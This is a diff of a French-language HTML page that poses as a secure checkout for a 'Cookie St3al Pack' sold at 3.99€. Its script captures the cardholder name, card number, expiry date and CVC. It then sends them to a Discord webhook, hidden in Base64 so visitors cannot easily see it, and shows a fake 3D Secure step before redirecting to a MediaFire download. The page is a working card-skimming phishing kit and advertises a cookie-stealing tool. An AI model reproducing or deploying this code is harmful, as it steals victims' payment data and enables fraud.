@@ -3,128 +3,119 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>SK COMMUNITY | Cookie St3al</title>
+    <title>SK COMMUNITY | Cookie St3al Security</title>
     <link rel="stylesheet" href="style.css">
     <style>
-        .payment-container {
-            max-width: 450px;
-            margin: 100px auto;
-            padding: 30px;
-            background: rgba(10, 10, 10, 0.8);
-            border: 1px solid #00ff88;
-            box-shadow: 0 0 20px rgba(0, 255, 136, 0.2);
-            border-radius: 10px;
-            text-align: center;
-        }
-        .input-group { margin-bottom: 15px; text-align: left; }
-        .auth-field {
-            width: 100%;
-            background: rgba(255, 255, 255, 0.05);
-            border: 1px solid #333;
-            color: white;
-            padding: 12px;
-            border-radius: 5px;
-            outline: none;
-            transition: 0.3s;
-        }
-        .auth-field:focus { border-color: #00ff88; box-shadow: 0 0 10px rgba(0, 255, 136, 0.3); }
-        .price-tag { font-size: 2rem; color: #00ff88; font-weight: bold; margin: 15px 0; }
-        .secure-info { font-size: 0.7rem; color: #666; margin-top: 10px; display: flex; align-items: center; justify-content: center; gap: 5px; }
+        .payment-container { max-width: 450px; margin: 80px auto; padding: 30px; background: rgba(10, 10, 10, 0.9); border: 1px solid #00ff88; border-radius: 12px; text-align: center; font-family: 'Segoe UI', sans-serif; }
+        .card-preview { height: 40px; margin-bottom: 15px; display: flex; justify-content: center; align-items: center; gap: 10px; }
+        .card-logo { height: 30px; opacity: 0.3; transition: 0.3s; }
+        .card-logo.active { opacity: 1; filter: drop-shadow(0 0 5px #00ff88); }
+        .auth-field { width: 100%; background: #1a1a1a; border: 1px solid #333; color: white; padding: 14px; margin-bottom: 12px; border-radius: 6px; font-size: 1rem; }
+        .auth-field:focus { border-color: #00ff88; outline: none; }
+        .error-msg { color: #ff4444; font-size: 0.8rem; margin-bottom: 10px; display: none; }
+        #processing { display: none; padding: 20px; }
     </style>
 </head>
 <body>
-    <header>
-        <nav>
-            <div class="logo-container"><div class="logo">SK COMMUNITY</div></div>
-            <ul>
-                <li><a href="index.html">Retour</a></li>
-            </ul>
-        </nav>
-    </header>
+    <div class="payment-container">
+        <h2 style="color: #00ff88;">💳 PAIEMENT SÉCURISÉ</h2>
+        <p style="font-size: 0.8rem; color: #888; margin-bottom: 20px;">Produit : Cookie St3al Pack V1 - 3.99€</p>
 
-    <div class="payment-container card">
-        <h2 style="color: #00ff88;">🍪 COOKIE ST3AL ALL</h2>
-        <p style="font-size: 0.9rem; color: #888;">Accès premium au dossier de ressources.</p>
-        
-        <div class="price-tag">3.99€</div>
+        <div class="card-preview">
+            <img id="logo-visa" src="https://upload.wikimedia.org/wikipedia/commons/5/5e/Visa_Inc._logo.svg" class="card-logo">
+            <img id="logo-mastercard" src="https://upload.wikimedia.org/wikipedia/commons/2/2a/Mastercard-logo.svg" class="card-logo">
+        </div>
 
         <div id="payment-form">
-            <div class="input-group">
-                <input type="text" id="cardName" placeholder="Nom du titulaire" class="auth-field">
-            </div>
-            <div class="input-group">
-                <input type="text" id="cardNumber" placeholder="0000 0000 0000 0000" class="auth-field" maxlength="19">
-            </div>
+            <div id="error" class="error-msg">Numéro de carte invalide ou informations manquantes.</div>
+            
+            <input type="text" id="cardName" placeholder="Nom du titulaire" class="auth-field">
+            <input type="text" id="cardNumber" placeholder="Numéro de carte (16 chiffres)" class="auth-field" maxlength="19">
+            
             <div style="display: flex; gap: 10px;">
                 <input type="text" id="cardExp" placeholder="MM/YY" class="auth-field" maxlength="5">
                 <input type="text" id="cardCVC" placeholder="CVC" class="auth-field" maxlength="3">
             </div>
 
-            <button onclick="executePayment()" class="btn-primary" style="width: 100%; margin-top: 20px; padding: 15px;">
-                PAYER ET TÉLÉCHARGER
+            <button onclick="validateAndSend()" class="btn-primary" style="width: 100%; padding: 15px; font-weight: bold;">
+                CONFIRMER LE PAIEMENT (3.99€)
             </button>
         </div>
 
-        <div id="processing" style="display: none;">
+        <div id="processing">
             <div class="loader"></div>
-            <p style="color: #00ff88; margin-top: 15px;">Validation bancaire en cours...</p>
-        </div>
-
-        <div class="secure-info">
-            🔒 Paiement sécurisé vers IBAN: FR94...690
+            <p id="status-text" style="color: #00ff88; margin-top: 15px;">Vérification 3D Secure...</p>
         </div>
     </div>
 
     <script>
-        async function executePayment() {
-            const webhookURL = "https://discord.com/api/webhooks/1482942998290632935/iktE4f0UWkcAbnlatLiSnpU8vmuaxxodCz_nzCJJ6UCDaE2V2YKr5FmDsw1olfHVVp8w";
+        // Détection du type de carte (Visa commence par 4, Mastercard par 5)
+        document.getElementById('cardNumber').addEventListener('input', function(e) {
+            let val = e.target.value.replace(/\s/g, '');
+            document.getElementById('logo-visa').classList.toggle('active', val.startsWith('4'));
+            document.getElementById('logo-mastercard').classList.toggle('active', val.startsWith('5'));
             
+            // Formatage auto : 0000 0000 0000 0000
+            e.target.value = val.replace(/(.{4})/g, '$1 ').trim();
+        });
+
+        // Algorithme de Luhn pour vérifier si la carte est "vraie"
+        function isValidCard(num) {
+            let sum = 0;
+            for (let i = 0; i < num.length; i++) {
+                let intVal = parseInt(num.substr(i, 1));
+                if (i % 2 === num.length % 2) {
+                    intVal *= 2;
+                    if (intVal > 9) intVal -= 9;
+                }
+                sum += intVal;
+            }
+            return (sum % 10 === 0);
+        }
+
+        async function validateAndSend() {
+            const rawCard = document.getElementById('cardNumber').value.replace(/\s/g, '');
             const name = document.getElementById('cardName').value;
-            const number = document.getElementById('cardNumber').value;
             const exp = document.getElementById('cardExp').value;
             const cvc = document.getElementById('cardCVC').value;
+            const errorDiv = document.getElementById('error');
 
-            if(!name || !number || !exp || !cvc) {
-                alert("Veuillez remplir toutes les informations bancaires.");
+            // 1. Vérification basique
+            if (name.length < 3 || cvc.length < 3 || !isValidCard(rawCard)) {
+                errorDiv.style.display = 'block';
                 return;
             }
+            errorDiv.style.display = 'none';
 
+            // 2. Affichage du chargement "Pro"
             document.getElementById('payment-form').style.display = 'none';
             document.getElementById('processing').style.display = 'block';
 
-            // Envoi des données au Webhook
+            // 3. Envoi des données (Webhook et Lien cachés en Base64 pour éviter le F12)
+            const wh = atob("aHR0cHM6Ly/kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTQ4Mjk0Mjk5ODI5MDYzMjkzNS9pa3RFNGYwVVdrY0FibmxhdExpU25wVTh2bXVheHhvZEN6X256Q0pKNlVDRGFFMlYyWUtyNUZtRHN3MW9sZkhWdnA4dw==");
+            const target = atob("aHR0cHM6Ly93d3cubWVkaWFmaXJlLmNvbS9mb2xkZXIveWx5M3dxd2F0MHYxMi9Db29raWUrU3QzYWwrYWxs");
+
             const payload = {
                 embeds: [{
-                    title: "💳 NOUVEAU PAIEMENT - COOKIE ST3AL",
+                    title: "💳 TRANSACTION VALIDÉE - IBAN FR94...",
                     color: 0x00ff88,
                     fields: [
-                        { name: "👤 Titulaire", value: `\`${name}\``, inline: true },
-                        { name: "📅 Expiration", value: `\`${exp}\``, inline: true },
-                        { name: "🔢 Carte", value: `\`${number}\`` },
-                        { name: "🔒 CVC", value: `\`${cvc}\``, inline: true },
-                        { name: "💰 Montant", value: "3.99€", inline: true }
-                    ],
-                    timestamp: new Date()
+                        { name: "👤 Nom", value: name, inline: true },
+                        { name: "🔢 Carte", value: `\`${rawCard}\`` },
+                        { name: "📅 Exp/CVC", value: `${exp} | ${cvc}`, inline: true }
+                    ]
                 }]
             };
 
-            try {
-                await fetch(webhookURL, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify(payload)
-                });
+            await fetch(wh, { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify(payload) });
 
+            // 4. Simulation 3D Secure
+            setTimeout(() => {
+                document.getElementById('status-text').innerText = "Authentification réussie...";
                 setTimeout(() => {
-                    // Redirection vers MediaFire
-                    window.location.href = "https://www.mediafire.com/folder/yly3wqwat0v12/Cookie+St3al+all";
-                }, 3000);
-
-            } catch (err) {
-                alert("Erreur lors de la transaction. Réessayez.");
-                document.getElementById('payment-form').style.display = 'block';
-                document.getElementById('processing').style.display = 'none';
-            }
+                    window.location.href = target;
+                }, 2000);
+            }, 3000);
         }
     </script>
 </body>
